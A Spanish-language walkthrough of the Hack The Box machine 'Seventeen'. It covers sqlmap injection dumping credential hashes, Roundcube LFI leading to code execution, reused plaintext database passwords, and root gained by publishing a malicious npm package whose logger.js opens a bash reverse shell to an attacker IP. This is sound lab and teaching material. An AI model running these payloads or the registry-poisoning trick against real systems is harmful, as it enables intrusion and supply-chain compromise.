---
title: Seventeen
date: 2023-05-01 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.93 scan initiated Mon May  1 17:06:44 2023 as: nmap -sCV -p22,80,8000 -Pn -oN targeted 10.10.11.165
Nmap scan report for 10.10.11.165
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2eb26ebb927d5e6b3693171a8209e464 (RSA)
|   256 1f57c653fc2d8b517d304202a4d65f44 (ECDSA)
|_  256 d5a5363819fe0d677916e6da1791ebad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  1 17:07:00 2023 -- 1 IP address (1 host up) scanned in 15.57 seconds
```

![imagen1](/assets/images/Seventeen/seventeen1.png)

Encontramos subdominios a lo que podemos echar un vistazo.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen$ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://seventeen.htb"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://seventeen.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/05/01 17:09:09 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.seventeen.htb (Status: 400) [Size: 301]
Found: exam.seventeen.htb (Status: 200) [Size: 17375]   
                                                        
===============================================================
2023/05/01 17:09:57 Finished
===============================================================
```
El revisar podemos ver que es otra página sobre lo mismo donde nos muestra examenes, al intentar ingresar al sitio de admin dice que no está habilitado. En este punto intenté hace LFI por el estilo en que está llamando las páginas dentro de la url, pero no tuve éxito de ninguna manera. En un principio se vio que es un exam management system, podemos buscar sobre eso con searchsploit.

![imagen2](/assets/images/Seventeen/seventeen2.png)

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen$ sudo searchsploit exam management system 
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Dell Kace 1000 Systems Management Appliance DS-2014-001 - Multiple SQL Injections                                                                      | php/webapps/39057.txt
Exam Hall Management System 1.0 - Unrestricted File Upload (Unauthenticated)                                                                           | php/webapps/50103.php
Exam Hall Management System 1.0 - Unrestricted File Upload + RCE (Unauthenticated)                                                                     | php/webapps/50111.py
Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                                                                      | php/webapps/50726.txt
Exam Reviewer Management System 1.0 - ‘id’ SQL Injection                                                                                           | php/webapps/50725.txt
```
El útimo llama la atención, revisamos que es y muestra una inyección sql sobre el parámetro id, procedos a probarlo con sql map y efectivamente es vulnerable a inyección sql.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen$ sqlmap 'http://exam.seventeen.htb?p=take_exam&id=1' -p id -D roundcubedb -T users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:15:30 /2023-05-01/

[22:15:30] [INFO] resuming back-end DBMS 'mysql' 
[22:15:30] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=2e8c1ef177d...70205a6f98'). Do you want to use those [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1790=1790 AND 'kbHu'='kbHu

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 9128 FROM (SELECT(SLEEP(5)))gdqd) AND 'Xvvf'='Xvvf
<SNIP>
Database: roundcubedb
Table: users
[1 entry]
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
| user_id | created             | username   | mail_host | language   | last_login          | preferences                                                       | failed_login        | failed_login_counter |
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
| 1       | 2022-03-19 21:30:30 | smtpmailer | localhost | en_US      | 2022-03-22 13:41:05 | a:1:{s:11:"client_hash";s:32:"0db936ce29d4c4d2a2f82db8b3d7870c";} | 2022-03-23 15:32:37 | 3                    |
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
```
```shell
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb

```
Tambien obtuvimos datos de otra base de datos.

```shell
do you want to use common password suffixes? (slow!) [y/N] 
[22:35:16] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[22:35:16] [INFO] starting 6 processes 
[22:35:26] [WARNING] no clear password(s) found                                                                                                                                         
Database: erms_db
Table: users
[3 entries]
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
```
```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen$ sqlmap -D db_sfms -T student -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10 --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:56:20 /2023-05-01/

[22:56:21] [INFO] resuming back-end DBMS 'mysql' 
[22:56:21] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=9e62aea64d9...7ec5f5bf24'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1790=1790 AND 'kbHu'='kbHu
---
<SNIP>
[4 entries]
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
```
En la base de datos de erms pudimos ver que apunta a una ruta oldamanagement que podríamos pensar que la ruta completa sería /var/www/oldmanagement, ponemos el subdominio en el /etc/hosts e intentamos acceder.

![imagen3](/assets/images/Seventeen/seventeen3.png)

Vemos que nos pide unas credenciales de estudiante, en la base de datos sfms encontramos el id de los estudiantes y una contraseña que pudo crackearla, con esto podríamos logearnos.

![imagen4](/assets/images/Seventeen/seventeen4.png)

Dentro de la plataforma nos encontramos con un archivo pdf donde muestra una carta donde menciona otro subdominio, lo copiamos y lo pegamos al /etc/hosts.

![imagen5](/assets/images/Seventeen/seventeen5.png)

Nos encontramos con una plataforma de roundcube, dentro su ruta ponemos changelog podemos visualizar la versión de este servicio.

![imagen6](/assets/images/Seventeen/seventeen6.png)

![imagen7](/assets/images/Seventeen/seventeen7.png)

Buscando en google encontramos [esta](https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube) vulnerabilidad que nos permite que mediante un LFI ejecutar comandos. El poc menciona que necesitamos una ruta donde subir un archivo, al volver atrás podemos ver que en el subdomino oldmanagement hay una opción de subir archivo, si de alguna manera podemos ver la ruta en la que esta se guarda podremos ejectuar comandos. Al subir un archivo podemos ver que apunta a un archivo php download, pero no parece la ruta completa, podemos [descargar](https://www.sourcecodester.com/php/14155/school-file-management-system.html) el código fuente ya que es de código abierto.

![imagen8](/assets/images/Seventeen/seventeen8.png)

```php
<?php
	require_once 'admin/conn.php';
	if(ISSET($_REQUEST['store_id'])){
		$store_id = $_REQUEST['store_id'];
		
		$query = mysqli_query($conn, "SELECT * FROM `storage` WHERE `store_id` = '$store_id'") or die(mysqli_error());
		$fetch  = mysqli_fetch_array($query);
		$filename = $fetch['filename'];
		$stud_no = $fetch['stud_no'];
		header("Content-Disposition: attachment; filename=".$filename);
		header("Content-Type: application/octet-stream;");
		readfile("files/".$stud_no."/".$filename);
	}
?>
```
Parece que para apuntar al archivo primero hace una consulta hacia la base de datos y concatena el campo stud_no que dumpeando la tabla storage vemos el número.

```shell
Database: db_sfms
Table: storage
[1 entry]
+----------+---------+----------------------+-----------------+----------------------+
| store_id | stud_no | filename             | file_type       | date_uploaded        |
+----------+---------+----------------------+-----------------+----------------------+
| 33       | 31234   | Marksheet-finals.pdf | application/pdf | 2020-01-26, 06:57 PM |
+----------+---------+----------------------+-----------------+----------------------+
```

![imagen9](/assets/images/Seventeen/seventeen9.png)

![imagen10](/assets/images/Seventeen/seventeen10.png)

Encontramos una ruta disponible, podemos intentar subir el archivo y verificarlo. Al intentar un archivo creado por nosotros no se ejecuta nada, fuzzeando por archivos php en esta ruta podemos encontrar el archivo papers.php. Lo logramos sobreescribir y podemos ver el output en la página de roundcube.

![imagen12](/assets/images/Seventeen/seventeen12.png)

![imagen11](/assets/images/Seventeen/seventeen11.png)

Teniendo ejecución remota de comandos podemos entablarnos una shell y estaremos dentro. Estamos en un contenedor primero empezamos revisando los archivos de configuración, dentro nos encontramos con una credenciales para una base de datos de innodb.

```shell
www-data@1dd96ed71ae0:/var/www/html/employeemanagementsystem$ cd process/
www-data@1dd96ed71ae0:/var/www/html/employeemanagementsystem/process$ ls
addempprocess.php  applyleaveprocess.php  aprocess.php	assignp.php  dbh.php  eprocess.php  images
www-data@1dd96ed71ae0:/var/www/html/employeemanagementsystem/process$ cat dbh.php 
<?php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

if(!$conn){
	echo "Databese Connection Failed";
}

?>
www-data@1dd96ed71ae0:/var/www/html/employeemanagementsystem/process$ su root 
Password: 
su: Authentication failure
www-data@1dd96ed71ae0:/var/www/html/employeemanagementsystem/process$ mysql -h localhost -u root -D ems -p
Enter password: 
ERROR 1524 (HY000): Plugin 'auth_socket' is not loaded
```
Al intentar entrar nos marca un error, al revisar los usuarios encontramos que mark está en ahí, al intentar conectarnos con mark en la máquina víctima nos logeamos satisfactoriamente.

```shell
mark@seventeen:~$ whoami
mark
mark@seventeen:~$ hostname -I
10.10.11.165 172.20.0.1 172.17.0.1 172.18.0.1 172.19.0.1
```
Dentro de la máquina en mails encontramos uno de kavi.

```shell
mark@seventeen:/var/mail$ cat kavi
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike
```
Hacemos un portforwarding del puert 4873 y vemos que tenemos un servicio de verdaccion.

![imagen13](/assets/images/Seventeen/seventeen13.png)

En el correo menciona sobre un old logger, con npm podemos buscar sobre esto.

```shell
mark@seventeen:/tmp/privesc$ npm search log --registry http://127.0.0.1:4873
npm WARN Building the local index for the first time, please be patient
▐ ╢░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
NAME      DESCRIPTION                                                  AUTHOR     DATE       VERSION KEYWORDS                  
db-logger Log data to a database                                       =kavigihan 2022-03-15 1.0.1   log                       
mark@seventeen:/tmp/privesc$ npm install db-logger --registry http://127.0.0.1:4873
/tmp/privesc
└─┬ db-logger@1.0.1 
  └─┬ mysql@2.18.1 
    ├── bignumber.js@9.0.0 
    ├─┬ readable-stream@2.3.7 
    │ ├── core-util-is@1.0.3 
    │ ├── inherits@2.0.4 
    │ ├── isarray@1.0.0 
    │ ├── process-nextick-args@2.0.1 
    │ ├── string_decoder@1.1.1 
    │ └── util-deprecate@1.0.2 
    ├── safe-buffer@5.1.2 
    └── sqlstring@2.3.1 

npm WARN enoent ENOENT: no such file or directory, open '/tmp/privesc/package.json'
npm WARN privesc No description
npm WARN privesc No repository field.
npm WARN privesc No README data
npm WARN privesc No license field.
mark@seventeen:/tmp/privesc/node_modules$ ls
bignumber.js  core-util-is  db-logger  inherits  isarray  mysql  process-nextick-args  readable-stream  safe-buffer  sqlstring  string_decoder  util-deprecate
```
Dentro de db-logger podemos encontrar una credenciales que usándolas para el usuario kavi por ssh funciona.

```shell
mark@seventeen:/dev/shm/node_modules/db-logger$ cat logger.js
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

function log(msg) {
    con.connect(function(err) {
        if (err) throw err;
        var date = Date();
        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
        con.query(sql, function (err, result) {
        if (err) throw err;
        console.log("[+] Logged");
        });
    });
};

module.exports.log = log
```
Dentro podemos ver que kavi puede ejecutar un script de bash como root.

```shell
kavi@seventeen:~$ sudo -l
[sudo] password for kavi: 
Matching Defaults entries for kavi on seventeen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh
kavi@seventeen:/opt/app$ cat startup.sh 
#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep --silent
        /bin/chown root:root node_modules -R
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"
```
Vemos que este script instala las dependencias db-logger y loglevel, se podría hacer un archivo js malicioso para cuando se descargue y se ejecute nos ejecute comandos como root. Para eso tenemos que crearnos nuestro propio servicio de verdaccio y modificando el archivo /home/kavi/.npmrc podemos apuntar a nuestro servicio y así ejecutando el script podemos lograrlo. Primero creamos nuestro proyecto con npm.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen/exploits$ npm init            
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.

See `npm help init` for definitive documentation on these fields
and exactly what they do.

Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.

Press ^C at any time to quit.
package name: (exploits) loglevel
version: (1.0.0) 2.0.0
description: 
entry point: (index.js) 
test command: 
git repository: 
keywords: 
author: 
license: (ISC) 
About to write to /home/gu3ro/Desktop/guero/htb/Seventeen/exploits/package.json:

{
  "name": "loglevel",
  "version": "2.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}


Is this OK? (yes) 
```
Creamos un archivo logger.js con el contenido malicioso.

```js
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1'")
function log(msg) {
console.log("[+] " + msg)
}
module.exports.log = log
```
```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen/exploits$ npm adduser --registry http://localhost:4873
npm notice Log in on http://localhost:4873/
Username: guero
Password: 
Email: (this IS public) guero@guero.htb
Logged in as guero on http://localhost:4873/.
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Seventeen/exploits$ npm publish --registry http://localhost:4873
npm notice 
npm notice 📦  loglevel@2.0.0
npm notice === Tarball Contents === 
npm notice 234B /index.js    
npm notice 204B /package.json
npm notice === Tarball Details === 
npm notice name:          loglevel                                
npm notice version:       2.0.0                                   
npm notice filename:      loglevel-2.0.0.tgz                      
npm notice package size:  374 B                                   
npm notice unpacked size: 438 B                                   
npm notice shasum:        336d97a8e0305f483fd908a3bebc27135e7a1664
npm notice integrity:     sha512-+kCOPdIp4PQE8[...]NgipNneByIe0Q==
npm notice total files:   2                                       
npm notice 
+ loglevel@2.0.0
```
Montado el servicio con el archivo malicioso, procedemos a cambiar el archivo .npmrc con nuestra ip y después ejecutamos para tener la bash suid.

```shell
kavi@seventeen:/opt/app$ echo 'registry=http://10.10.14.5:4873/' > ~/.npmrc; sudo /opt/app/startup.sh
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.1.3 
└── mysql@2.18.1 

[+] Starting the app
[+] INFO:  Server running on port 8000


kavi@seventeen:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
kavi@seventeen:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
kavi@seventeen:~$ bash -p
bash-4.4# whoami
root
```
